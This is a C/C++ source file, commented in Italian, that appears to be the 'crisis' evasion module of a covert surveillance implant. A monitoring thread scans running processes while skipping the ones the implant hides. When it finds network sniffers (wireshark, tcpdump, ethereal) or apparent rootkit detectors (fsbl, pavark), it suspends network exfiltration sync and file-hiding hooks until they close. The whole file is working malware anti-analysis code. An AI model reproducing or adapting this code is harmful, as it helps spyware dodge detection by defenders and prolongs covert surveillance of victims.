HANDLE hCrisisThread = NULL;
BOOL bPM_CrisisAgentStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
BOOL bPM_crcp = FALSE; // Semaforo per l'uscita del thread

//extern BOOL network_crisis; // Se deve fermare le sync
//extern BOOL system_crisis;  // Se deve fermare i comandi e l'hiding

BOOL cr_check_system = FALSE;
BOOL cr_check_network = FALSE;

#define MAX_DYNAMIC_CRISIS_SYSTEM 10
#define EMBEDDED_CRISIS_SYSTEM 2
DWORD process_crisis_system_count = 0;

#define MAX_DYNAMIC_CRISIS_NETWORK 10
#define EMBEDDED_CRISIS_NETWORK 3
DWORD process_crisis_network_count = 0;

WCHAR process_crisis_system[MAX_DYNAMIC_CRISIS_SYSTEM+EMBEDDED_CRISIS_SYSTEM][MAX_PATH];
WCHAR process_crisis_network[MAX_DYNAMIC_CRISIS_NETWORK+EMBEDDED_CRISIS_NETWORK][MAX_PATH];

// Funzione esportata per vedere se e' in un momento di crisi
BOOL IsCrisisNetwork()
{
	return network_crisis;
}

BOOL IsCrisisSystem()
{
	return system_crisis;
}

#define CRISIS_SLEEPTIME 100
#define CRISIS_SLEEP_ITER 7 //La sleep totale e' di CRISIS_SLEEP_ITER*CRISIS_SLEEPTIME
DWORD WINAPI MonitorCrisisThread(DWORD dummy)
{
	DWORD i;
	HANDLE proc_snap;
	PROCESSENTRY32W lppe;
	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
	BOOL process_network_found, process_system_found;

	LOOP {
		process_network_found = FALSE;
		process_system_found = FALSE;

		proc_snap = FNC(CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, NULL);
		// Cicla tutti i processi attivi 
		lppe.dwSize = sizeof(PROCESSENTRY32W);
		if (proc_snap != INVALID_HANDLE_VALUE && FNC(Process32FirstW)(proc_snap,  &lppe)) {
			do {
				// Se ha gia' trovato le cose per cui deve ceckare, allora interrompe il ciclo
				if ((!cr_check_system || process_system_found) && (!cr_check_network || process_network_found))
					break;

				// Non considera i processi che stiamo nascondendo.
				SET_PID_HIDE_STRUCT(pid_hide, lppe.th32ProcessID);
				if (AM_IsHidden(HIDE_PID, &pid_hide))
					continue;

				// Cicla i processi system crisis
				if (cr_check_system) {
					for (i=0; i<process_crisis_system_count && !process_system_found; i++) {
						if (CmpWildW(process_crisis_system[i], lppe.szExeFile)) {
							process_system_found = TRUE;
						}
					}
				}

				// Cicla i processi netork crisis
				if (cr_check_network) {
					for (i=0; i<process_crisis_network_count && !process_network_found; i++) {
						if (CmpWildW(process_crisis_network[i], lppe.szExeFile)) {
							process_network_found = TRUE;
						}
					}
				}

			} while(FNC(Process32NextW)(proc_snap,  &lppe));
		
		}

		if (proc_snap != INVALID_HANDLE_VALUE)
			CloseHandle(proc_snap);

		// Se e' cambiato lo stato del crisis network, riporta un messaggio
		// XXX Questo thread gira anche durante la sync, ma le probabilita' di una race sui log
		// sono infinitesimali
		if (!network_crisis && process_network_found)
			SendStatusLog(L"[Crisis]: Network activity inhibited");
		else if (network_crisis && !process_network_found)
			SendStatusLog(L"[Crisis]: Network activity restarted");

		// Se ha trovato un processo pericoloso (perche' lo stava checkando) allora setta lo stato
		system_crisis  = process_system_found;
		network_crisis = process_network_found;
		AM_IPCAgentStartStop(PM_CRISISAGENT, system_crisis); // l'hook per l'hiding dei file e' relatico a system crisis

		for (i=0; i<CRISIS_SLEEP_ITER; i++) {
			Sleep(CRISIS_SLEEPTIME);
			CANCELLATION_POINT(bPM_crcp);
		}
	}
}


DWORD __stdcall PM_CrisisAgentStartStop(BOOL bStartFlag, BOOL bReset)
{
	DWORD dummy;

	// Durante la sync non lo stoppa (dato che non produce log)
	if (!bReset)
		return 0;

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_CrisisAgentStarted == bStartFlag)
		return 0;

	bPM_CrisisAgentStarted = bStartFlag;

	if (bStartFlag) {
		hCrisisThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorCrisisThread, NULL, 0, &dummy);
	} else {
		QUERY_CANCELLATION(hCrisisThread, bPM_crcp);
		// Se stoppo l'agente azzero gli stati di crisi
		network_crisis = FALSE;
		system_crisis = FALSE;
		AM_IPCAgentStartStop(PM_CRISISAGENT, FALSE);
	}

	return 1;
}



DWORD __stdcall PM_CrisisAgentInit(JSONObject elem)
{
	JSONObject network, hook;
	JSONArray network_array, hook_array;
	DWORD i;

	wcscpy(process_crisis_network[0], L"wireshark.exe");
	wcscpy(process_crisis_network[1], L"ethereal.exe");
	wcscpy(process_crisis_network[2], L"tcpdump.exe");

	wcscpy(process_crisis_system[0], L"fsbl.exe");
	wcscpy(process_crisis_system[1], L"pavark.exe");
		
	// Se non ci sono i due oggetti allora non lo inizializza
	if (!elem[L"network"]->IsObject() || !elem[L"hook"]->IsObject())
		return 1;

	network = elem[L"network"]->AsObject();
	hook = elem[L"hook"]->AsObject();
	cr_check_network = (BOOL) network[L"enabled"]->AsBool();
	cr_check_system = (BOOL) hook[L"enabled"]->AsBool();

	network_array = network[L"processes"]->AsArray();
	hook_array = hook[L"processes"]->AsArray();

	process_crisis_network_count = network_array.size();
	process_crisis_system_count = hook_array.size();

	if (process_crisis_network_count > MAX_DYNAMIC_CRISIS_NETWORK)
		process_crisis_network_count = MAX_DYNAMIC_CRISIS_NETWORK;
	if (process_crisis_system_count > MAX_DYNAMIC_CRISIS_SYSTEM)
		process_crisis_system_count = MAX_DYNAMIC_CRISIS_SYSTEM;

	process_crisis_network_count += EMBEDDED_CRISIS_NETWORK;
	process_crisis_system_count  += EMBEDDED_CRISIS_SYSTEM;

	for (i=0; i<network_array.size(); i++) 
		wcscpy(process_crisis_network[i+EMBEDDED_CRISIS_NETWORK], network_array[i]->AsString().c_str());

	for (i=0; i<hook_array.size(); i++) 
		wcscpy(process_crisis_system[i+EMBEDDED_CRISIS_SYSTEM], hook_array[i]->AsString().c_str());

	// All'inizio le crisi sono disattivate, sara' il thread ad attivarle
	network_crisis = FALSE;
	system_crisis = FALSE;
	AM_IPCAgentStartStop(PM_CRISISAGENT, FALSE);

	return 1;
}


void PM_CrisisAgentRegister()
{
	network_crisis = FALSE;
	system_crisis = FALSE;		
	AM_MonitorRegister(L"crisis", PM_CRISISAGENT, NULL, (BYTE *)PM_CrisisAgentStartStop, (BYTE *)PM_CrisisAgentInit, NULL);
}